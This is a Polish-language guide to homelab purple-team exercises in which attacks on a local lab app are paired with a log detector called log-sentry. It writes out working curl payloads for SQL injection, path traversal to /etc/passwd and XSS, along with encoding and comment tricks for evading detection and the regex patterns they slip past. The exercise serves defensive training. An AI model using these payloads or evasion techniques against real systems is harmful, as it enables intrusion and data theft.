# Homelab Purple Team Scenarios & Evasion Exercises

Ten przewodnik opisuje serię praktycznych ćwiczeń z zakresu **Purple Teaming**: symulowania ataków (Red Team) oraz testowania i omijania silnika detekcji (Blue Team / `log-sentry`).

---

## Petla Purple Teaming (The Feedback Loop)

```text
 ┌──────────────┐       ┌──────────────┐       ┌──────────────┐
 │   RED TEAM   │ ----> │    TARGET    │ ----> │  BLUE TEAM   │
 │ Wyslanie     │       │ Zapisanie    │       │ Analiza logu │
 │ ataku        │       │ access.log   │       │ (log-sentry) │
 └──────────────┘       └──────────────┘       └──────┬───────┘
        ▲                                             │
        │             Proba ominiecia (Bypass)        │
        └─────────────────────────────────────────────┘
```

---

## Scenariusz 1: SQL Injection (SQLi)

### 1.1 Atak standardowy (Jawny)
Atakujący próbuje wyciągnąć tabele bazodanowe za pomocą standardowej klauzuli `UNION SELECT`:
```bash
curl "http://localhost:8080/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users"
```
* **Wynik w aplikacji**: Podatny endpoint zwraca zrzuconą zawartość bazy (tablicę `users`).
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do reguły `union.*select`).

### 1.2 Technika Omijania (Evasion: Inline Comments)
W silnikach takich jak MySQL/SQLite komentarze `/**/` działają jak spacja, ale z punktu widzenia prostego analizatora logów rozbijają słowa kluczowe:
```bash
curl "http://localhost:8080/products?id=1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users"
```
* **Wynik w aplikacji**: Baza wykonuje zapytanie i zwraca dane.
* **Detekcja w `log-sentry`**: `[BYPASS]` (w zależności od regexa komentarze mogą zmylić prosty wzorzec).

---

## Scenariusz 2: Directory Traversal (LFI)

### 2.1 Atak standardowy (Jawny)
Atakujący próbuje odczytać plik `/etc/passwd`:
```bash
curl "http://localhost:8080/download?file=../../../../etc/passwd"
```
* **Wynik w aplikacji**: Aplikacja symuluje wyciek `/etc/passwd`.
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do `\.\./` oraz `/etc/passwd`).

### 2.2 Technika Omijania (Evasion: URL Encoding)
Atakujący koduje ukośnik `/` jako `%2f` lub kropkę `.` jako `%2e`:
```bash
curl "http://localhost:8080/download?file=..%2f..%2f..%2f..%2fetc/passwd"
```
* **Wynik w aplikacji**: Serwer WWW / aplikacja przed użyciem parametru dekoduje URL, więc plik zostaje odczytany.
* **Detekcja w `log-sentry`**: `[BYPASS]` (jeśli `log-sentry` nie dekoduje `unquote()` przed przeszukaniem regexem).

### 2.3 Technika Zaawansowana: Double URL Encoding
```bash
curl "http://localhost:8080/download?file=%252e%252e%252f%252e%252e%252fetc/passwd"
```
W podwójnym kodowaniu znak `%` zamienia się w `%25`. Serwery z podwójną warstwą proxy często dekodują zapytanie dwukrotnie, podczas gdy prosty skrypt analizujący widzi tylko ciąg znaków `%252e`.

---

## Scenariusz 3: Cross-Site Scripting (XSS)

### 3.1 Atak standardowy (Jawny)
Klasyczne wstrzyknięcie tagu `<script>`:
```bash
curl "http://localhost:8080/search?q=<script>alert('xss')</script>"
```
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (sygnatura `<script.*?>`).

### 3.2 Technika Omijania (Evasion: Event Handlers bez Script)
Wstrzyknięcie wektora w tagach multimedialnych lub graficznych:
```bash
curl "http://localhost:8080/search?q=<svg/onload=alert(1)>"
curl "http://localhost:8080/search?q=<body/onpageshow=alert(1)>"
```
* **Detekcja w `log-sentry`**: `[BYPASS]` (brak słowa `script` i brak `onerror=`).

---

## Scenariusz 4: Wykrywanie skanerow po User-Agent

Atakujący często korzystają z automatycznych narzędzi (`sqlmap`, `nikto`, `gobuster`):
```bash
curl -H "User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)" "http://localhost:8080/products?id=1"
```
* **Wniosek do poprawy detekcji**: Jeśli `log-sentry` analizuje wyłącznie pole `path`, to narzędzie takie jak `sqlmap` pozostaje niewidoczne w logach, dopóki nie wyśle oczywistego payloadu.

---

## Jak przeprowadzic cwiczenie:

1. Wyczyść logi:
   ```bash
   ./lab.sh clean
   ```
2. Odpal serwer labu:
   ```bash
   ./lab.sh start
   ```
3. Odpal atakujące scenariusze:
   ```bash
   ./lab.sh attack all
   ```
4. Zbadaj wyniki detekcji:
   ```bash
   ./lab.sh analyze
   ```
5. Przeanalizuj, które ataki z grupy **EVASION** nie zostały wykryte, a następnie ulepsz kod `log-sentry`.
